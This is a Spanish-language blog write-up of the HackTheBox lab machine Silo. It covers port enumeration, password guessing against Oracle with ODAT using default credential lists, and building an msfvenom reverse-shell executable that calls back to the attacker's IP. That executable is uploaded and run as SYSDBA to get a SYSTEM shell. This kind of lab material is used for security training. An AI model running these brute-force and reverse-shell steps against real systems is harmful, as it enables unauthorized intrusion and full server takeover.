---
layout: post
title: HTB_Silo
date: 2023/07/10
slug: HTB_Silo
heroImage: /assets/machines.jpg
---

# Silo {-}

## Introduccion {-}

La maquina del dia 11/08/2021 se llama Silo
.

El replay del live se puede ver aqui

[![S4vitaar Silo maquina](https://img.youtube.com/vi/-nb98Pb8oP0/0.jpg)](https://www.youtube.com/watch?v=-nb98Pb8oP0&t=910s)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.82
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.82
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.82 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 10.10.10.82 -oN targeted
```


| Puerto | Servicio   | Que se nos occure?             | Que falta? |
| ------ | ---------- | ------------------------------ | ---------- |
| 80     | http       | Web, fuzzing                   |            |
| 135    | msrpc      |                                |            |
| 139    | netbios    |                                |            |
| 445    | smb        | Null session                   |            |
| 1521   | oracle-tns | Attacke con ODAT               |            |
| 5985   | msrpc      | Puertos por defecto de windows |            |
| 47001  | msrpc      | Puertos por defecto de windows |            |
| 49152  | msrpc      | Puertos por defecto de windows |            |
| 49153  | msrpc      | Puertos por defecto de windows |            |
| 49154  | msrpc      | Puertos por defecto de windows |            |
| 49155  | msrpc      | Puertos por defecto de windows |            |
| 49159  | msrpc      | Puertos por defecto de windows |            |
| 49160  | msrpc      | Puertos por defecto de windows |            |
| 49161  | msrpc      | Puertos por defecto de windows |            |
| 49162  | msrpc      | Puertos por defecto de windows |            |


### Analyzando el SMB {-}

```bash
crackmapexec smb 10.10.10.82
smbclient -L 10.10.10.82 -N
```

Vemos que estamos en frente de una maquina Windows Server 2021 R2 de 64 bit pro que se llama **SILO** en el dominio **SILO** y poco mas

### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.82
```

Nada muy interressante aqui


#### Checkear la web {-}

Sabemos que es un IIS 8.5 y asp.net pero poco mas. Vamos a fuzzear routas.


## Vulnerability Assessment {-}

### Oracle ataque con ODAT {-}

#### Installacion de ODAT {-}

```bash
git clone https://github.com/quentinhardy/odat
cd odat
git submodule init
git submodule update
sudo apt-get install libaio1 python3-dev alien python3-pip
pip3 install cx_Oracle
```

Como la maquina victima es de 64 bits, descargamos los client basic sdk y sqlplus de la web de oracle

```bash
mkdir isolation
cd isolation
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-basic-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-sqlplus-21.1.0.0.0-1.x86_64.rpm
wget https://download.oracle.com/otn_software/linux/instantclient/211000/oracle-instantclient-devel-21.1.0.0.0-1.x86_64.rpm
```

ahora transformamos los 
```bash
 .rpm 
```
 en 
```bash
 .deb 
```
 y lo installamos

```bash
alien --to-deb *.rpm
dpkg -i *.deb
```

Añadimos las variables de entorno el la .zshrc

```bash
ls /usr/lib/oracle

#Output
21

vi ~/.zshrc

export ORACLE_HOME=/usr/lib/oracle/21/client64/
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:$ORACLE_HOME/lib
export PATH=${ORACLE_HOME}bin:$PATH
```

Checkeamos que todo se aya installado bien

```bash
sqlplus64
python3 odat.py --help
```

#### Ataque con ODAT {-}

1. Buscamos si encontramos SID's

    ```bash
    python3 odat.py sidguesser -s 10.10.10.82
    ```

1. Ataque de typo password guesser

    ```bash
    locate oracle_ | grep "pass"
    cat /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt | tr ' ' '/' | > passwords
    python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file passwords
    ```

1. Ahora que tenemos un usuario y una contraseña utilizamos el parametro utlfile que permite descargar, uploadear y supprimir ficheros

    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -f exe -o shell.exe
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger"
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe
    ```

1. No tenemos sufficientes privilegios para subir archivos pero ODAT tiene un parametro 
```bash
 --sysdba 
```
 que nos puede ayudar

    ```bash
    python3 odat.py utlfile -s 10.10.10.82 -d XE -U "scott" -P "tiger" --putFile /Temp shell.exe --sysdba
    ```

1. Intentamos ganar accesso al systema
## Vuln exploit & Gaining Access {-}

### Ganando accesso con ODAT {-}

Nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

Intentamos ejecutar el exploit con odat

```bash
python3 odat.py --help
python3 odat.py externaltable -s 10.10.10.82 -d XE -U "scott" -P "tiger" --sysdba --exec /Temp shell.exe
```

Ya hemos ganado accesso al systema y ademas somos nt authority\system que significa que no es necessario hacer escalada de privilegios.
